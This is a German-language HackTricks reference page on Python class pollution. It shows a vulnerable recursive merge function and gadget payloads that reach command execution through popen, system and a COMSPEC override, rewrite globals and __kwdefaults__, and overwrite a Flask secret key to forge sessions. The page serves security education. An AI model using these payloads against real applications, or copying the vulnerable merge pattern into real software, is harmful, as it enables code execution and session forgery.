# Class Pollution (Python's Prototype Pollution)

{{#include ../../banners/hacktricks-training.md}}

## Einfaches Beispiel

Das Ändern von `__qualname__` über die Klassenreferenz einer Instanz aktualisiert die Klasse und ihre veränderlichen Basisklassen.<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Grundlegendes Beispiel für eine Schwachstelle

Ein rekursives Zusammenführen kann vom Angreifer kontrollierte Mapping-Schlüssel akzeptieren und verschachtelte Werte entweder über den Element- oder den Attributzugriff schreiben.<sup>[[1]](#references)</sup>
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget-Beispiele

<details>

<summary>Erstellen eines Standardwerts für eine Klasseneigenschaft für RCE (subprocess)</summary>

Eine gemeinsam genutzte Basisklasse kann ein Standardattribut bereitstellen, das von einem Command-Gadget einer Geschwisterklasse verwendet wird.<sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Andere Klassen und globale Variablen über <code>globals</code> polluten</summary>

Die Zuordnung `__globals__` einer Funktion legt den Modulnamensraum offen, der von einer in diesem Modul definierten Methode aus erreichbar ist.<sup>[[1]](#references)[[4]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Beliebige Subprozessausführung</summary>

Unter Windows verwendet `Popen(..., shell=True)` die Umgebungsvariable `COMSPEC` als Standard-Shell. Dieses Gadget demonstriert daher eine umgebungsvariablenbasierte Befehlsumleitung.<sup>[[1]](#references)[[5]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Überschreiben von <strong><code>__kwdefaults__</code></strong></summary>

Python dokumentiert `__kwdefaults__` als Zuordnung der Standardwerte für keyword-only-Parameter, die in einer Funktionsdefinition auf `*` oder `*args` folgen.<sup>[[4]](#references)</sup> Das folgende gadget überschreibt diese Zuordnung über einen manipulierten Funktionspfad.<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Flask-Secret über mehrere Dateien überschreiben</summary>

Wenn sich die Klasse des polluted object in einem anderen Modul als dem Entry-Point-Modul der Anwendung befindet, geben die `__globals__` ihrer Methoden zunächst den Namespace des Klassenmoduls frei. Eine Traversierung durch den Loader und `sys.modules.__main__` kann anschließend das Entry-Point-Modul und dessen Flask-`app`-Objekt erreichen.<sup>[[1]](#references)[[2]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Flask verwendet `app.secret_key`, um das Session-Cookie zu signieren; die Kenntnis des Schlüssels ermöglicht es einem Angreifer, gültige Session-Daten zu erstellen.<sup>[[6]](#references)</sup>

Das ursprüngliche Writeup zeigt den folgenden Pfad zu `app.secret_key`; CTFtime hostet ebenfalls eine Kopie des Writeups.<sup>[[2]](#references)[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Das Ändern des Schlüssels kann das Signieren von Ersatz-Session-Cookies ermöglichen und möglicherweise eine Rechteausweitung ermöglichen; siehe [die Flask-Session-Tool-Seite](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).<sup>[[6]](#references)</sup>

</details>

Siehe auch die folgende Seite für weitere schreibgeschützte Gadgets:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [idekCTF 2022 Aufgabenmanager-Write-up (Original)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
- [3] [CTFtime - idekCTF 2022: Aufgabenmanager-Write-up](https://ctftime.org/writeup/36082)
- [4] [inspect — Live-Objekte inspizieren](https://docs.python.org/3/library/inspect.html)
- [5] [subprocess — Subprozessverwaltung](https://docs.python.org/3/library/subprocess.html)
- [6] [Quickstart — Flask-Dokumentation](https://flask.palletsprojects.com/en/stable/quickstart/)
{{#include ../../banners/hacktricks-training.md}}
